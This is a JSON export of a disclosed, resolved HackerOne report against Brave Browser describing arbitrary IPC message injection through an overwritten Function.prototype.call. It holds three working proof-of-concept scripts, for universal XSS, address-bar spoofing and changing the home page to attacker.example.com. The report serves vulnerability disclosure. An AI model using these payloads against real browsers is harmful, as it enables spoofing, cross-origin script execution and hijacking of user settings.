@@ -1,0 +1,116 @@
+{
+  "id": 187542,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODc1NDI=",
+  "url": "https://hackerone.com/reports/187542",
+  "title": "Brave Browser unexpectedly allows to send arbitrary IPC messages",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2016-12-02T00:41:45.053Z",
+  "submitted_at": "2016-12-02T00:41:45.053Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "masatokinugawa",
+    "url": "/masatokinugawa",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/268/8726487298cd9ad456637d3e948587d1365d869a_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15688,
+    "url": "https://hackerone.com/brave",
+    "handle": "brave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Brave Software",
+      "twitter_handle": "brave",
+      "website": "https://brave.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-09-18T18:15:18.396Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-08-18T08:42:52.419Z",
+  "team_member_agreed_on_going_public_at": "2018-09-18T18:15:17.846Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nI found that Brave Browser allows to overwrite the internal js code from the user js code.\nUsing this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. \n\n## Steps to Reproduce:\n\n1 .  An attacker overwrites `Function.prototype.call`, like this:\n\n```\nFunction.prototype.call=function(e){\n    if(e[0]&&e[0]==\"window-alert\"){\n        e[0]=\"[ARBITRARY_IPC_MESSAGE_HERE]\";\n        e[1]=\"[ARBITRARY_IPC_MESSAGE_HERE]\";\n    }\n    return this.apply(e);\n}\n```\n2 .  An attacker calls `alert()`.\n\n3 .  Brave's `alert()` function calls `Function.prototype.call` in the internal code. At this time, the overwritten `Function.prototype.call` is used in the `alert` internal code.\n\n4 .  `Function.prototype.call` receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.\n\n## PoC:\n\nI'd like to show three PoCs:\n\n###UXSS PoC\n\n(If it goes well, you can see an alert dialog on google's domain.)\n```\n<script>\nFunction.prototype.call=function(e){\n    if(e[0]&&e[0]==\"window-alert\"){\n        e[0]=\"dispatch-action\";\n        e[1]='{\"actionType\":\"window-new-frame\",\"frameOpts\":{\"location\":\"https://www.google.com/ncr\"},\"openInForeground\":true}'\n    }\n    return this.apply(e);\n}\nalert();\n\nsetTimeout(function(){\n\tfor(var windowKey=0;windowKey<10000;windowKey++){\n\t\tFunction.prototype.call=function(e){\n\t\t\tif(e && e[0] && e[0]==\"window-alert\"){\n\t\t\t\te[0]=\"dispatch-action\";\n\t\t\t\te[1]=`{\"actionType\":\"window-set-url\",\"location\":\"javascript:alert('document.domain is: '+document.domain)\",\"key\":${windowKey}}`\n\t\t\t}\n\t\t\treturn this.apply(e);\n\t\t}\n\t\talert();\n\t}\n},3000);\n</script>\n```\n\n\n###Address Bar Spoofing PoC\n\n(If it goes well, you can see https://www.google.com/ in address bar.)\n```\n<script>\nFunction.prototype.call=function(e){\n\tif(e && e[0] && e[0]==\"window-alert\"){\n\t\te[0]=\"dispatch-action\";\n\t\te[1]='{\"actionType\":\"window-set-navbar-input\",\"location\":\"https://www.google.com/\"}';\n\t}\n\treturn this.apply(e);\n}\nalert();\n</script>\n```\n\n\n###Change browser settings PoC\n\n(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in `about:preferences`. )\n```\n<script>\nFunction.prototype.call=function(e){\n    if(e[0]&&e[0]==\"window-alert\"){\n        e[0]=\"dispatch-action\";\n        e[1]='{\"actionType\":\"app-change-setting\",\"key\":\"general.homepage\",\"value\":\"http://attacker.example.com/\"}'\n    }\n    return this.apply(e);\n}\nalert();\n</script>\n```\n\nFYI, Electron has similar issues. I reported it to Electron team and they are working on it.\nCould you confirm this bug?\nThanks!",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 9,
+  "voters": [
+    "ali",
+    "spam404",
+    "apapedulimu",
+    "pekafat",
+    "eveeez",
+    "cryptographer",
+    "0619",
+    "spetr0x",
+    "jatacheers"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
